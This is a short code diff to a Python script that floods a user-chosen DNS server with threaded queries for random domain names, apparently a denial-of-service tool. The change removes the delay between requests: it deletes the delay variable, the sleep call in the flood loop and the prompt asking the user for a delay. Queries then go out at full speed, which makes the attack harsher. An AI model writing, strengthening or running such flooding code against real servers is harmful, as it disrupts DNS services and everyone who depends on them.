@@ -5,7 +5,6 @@ import random
 import string
 import threading
 
-delay = 1
 threads = 4
 answ = False
 
@@ -30,7 +29,6 @@ def flood():
             answ = perform_query(userDNS, f"{domainToUse}.com", ipToUse)
         except:
             domainToUse = getRandDomain()
-        sleep(delay)
 
 def startThreads():
     for i in range(1,threads):
@@ -62,22 +60,12 @@ else:
     print("Searching declined!")
     sleep(1)
 
-userDelay = input(f"Specify Delay between requests (def {delay}s): ")
-
 if answ is False:
     userDNS = input("Specify DNS Server to use: ")
 else:
     userDNS = answ
 
 userThreads = input(f"Specify Threads to use (def {threads}): ")
-
-if userDelay == '':
-    print(f"Using Default Delay of {delay}")
-    sleep(0.5)
-else:
-    print(f"Using Delay of {userDelay}")
-    delay = float(userDelay)
-    sleep(0.5)
 
 if userThreads == '':
     print(f"Using Default Threads count of {threads}")
